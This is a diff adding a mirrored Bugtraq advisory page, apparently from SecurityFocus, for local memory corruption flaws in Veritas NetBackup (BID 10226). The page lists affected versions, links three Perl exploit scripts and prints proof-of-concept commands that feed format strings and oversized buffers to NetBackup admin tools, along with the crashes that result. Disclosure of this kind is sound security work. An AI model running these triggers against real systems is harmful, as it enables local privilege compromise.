@@ -1,0 +1,185 @@
+#SpeeDr00t@Black Falcon<br>#bid10226<p><b><span style="font-size: 18pt;">Veritas NetBackup Multiple Unspecified Local Memory Corruption Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/10226/info">info</a><br><a href="http://www.securityfocus.com/bid/10226/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/10226/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/10226/solution">solution</a><br><a href="http://www.securityfocus.com/bid/10226/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				10226
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Unknown
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Apr 27 2004 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Apr 27 2004 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Discovery of these issues is credited to Secure Network Operations.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Veritas Software NetBackup Global Data Manager 5.0 <br/>
+					
+				
+					Veritas Software NetBackup Global Data Manager 4.5  MP4<br/>
+					
+				
+					Veritas Software NetBackup Global Data Manager 4.5  MP3<br/>
+					
+				
+					Veritas Software NetBackup Global Data Manager 4.5  MP2<br/>
+					
+				
+					Veritas Software NetBackup Global Data Manager 4.5  MP1<br/>
+					
+				
+					Veritas Software NetBackup Global Data Manager 4.5  FP4<br/>
+					
+				
+					Veritas Software NetBackup Global Data Manager 4.5  FP3<br/>
+					
+				
+					Veritas Software NetBackup Global Data Manager 4.5  FP2<br/>
+					
+				
+					Veritas Software NetBackup Global Data Manager 4.5  FP1<br/>
+					
+				
+					Veritas Software NetBackup Global Data Manager 4.5 <br/>
+					
+				
+					Veritas Software NetBackup DataCenter 5.0 <br/>
+					
+				
+					Veritas Software NetBackup DataCenter 4.5 <br/>
+					
+				
+					Veritas Software NetBackup Advanced Reporter 5.0 <br/>
+					
+				
+					Veritas Software NetBackup Advanced Reporter 4.5  MP4<br/>
+					
+				
+					Veritas Software NetBackup Advanced Reporter 4.5  MP3<br/>
+					
+				
+					Veritas Software NetBackup Advanced Reporter 4.5  MP2<br/>
+					
+				
+					Veritas Software NetBackup Advanced Reporter 4.5  MP1<br/>
+					
+				
+					Veritas Software NetBackup Advanced Reporter 4.5  FP4<br/>
+					
+				
+					Veritas Software NetBackup Advanced Reporter 4.5  FP3<br/>
+					
+				
+					Veritas Software NetBackup Advanced Reporter 4.5  FP2<br/>
+					
+				
+					Veritas Software NetBackup Advanced Reporter 4.5  FP1<br/>
+					
+				
+					Veritas Software NetBackup Advanced Reporter 4.5 <br/>
+					
+				
+					Veritas Software NetBackup Advanced Reporter 3.4 <br/>
+					
+				
+					Veritas Software Net Backup Professional 3.51.30 <br/>
+					
+				
+					Veritas Software Net Backup Professional 3.51.20 <br/>
+					
+				
+					Veritas Software Net Backup Professional 3.51.15 <br/>
+					
+				
+					Veritas Software Net Backup Professional 3.51.10 <br/>
+					
+				
+					Veritas Software Net Backup Professional 3.51 <br/>
+					
+				
+					Veritas Software Net Backup Professional 3.6 <br/>
+					
+				
+					Veritas Software Net Backup Professional 3.5 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>#<a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/0x11000/10226/bpexploit.pl">#exploit_bpexploit.pl</a><br><a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/0x11000/10226/netbkup.pl">#exploit_netbkup.pl</a><br><a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/0x11000/10226/Veritas_multi.pl">#exploit_Veritas_multi.pl</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The following proof of concept exploits and examples have been supplied:<br/><br/>$ ./bin/admincmd/bpimage --%x.%x.%x.%x.%x<br/>bpimage: unrecognized option --40481034.40016aec.bffed1d4.0.0<br/><br/>$ ./bin/admincmd/bpimport --n%n%n%n%n%n<br/>Segmentation fault<br/><br/>$ ../admincmd/bpmedia -unfreeze %x<br/>bpmedia: unrecognized option 40481034<br/>bpmedia:<br/><br/>$ ./netbackup/bin/admincmd/bpdir -M `perl -e 'print "A" x 1282'`<br/>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...<br/>Segmentation fault<br/><br/>$ ./bpmedialist -h `perl -e 'print "A" x 9000'`<br/>Segmentation fault
+	
+		<ul>
+<li><a href="/data/vulnerabilities/exploits/bpexploit.pl">/data/vulnerabilities/exploits/bpexploit.pl</a></li>
+<li><a href="/data/vulnerabilities/exploits/netbkup.pl">/data/vulnerabilities/exploits/netbkup.pl</a></li>
+<li><a href="/data/vulnerabilities/exploits/Veritas_multi.pl">/data/vulnerabilities/exploits/Veritas_multi.pl</a></li>
+</ul>
+</div>
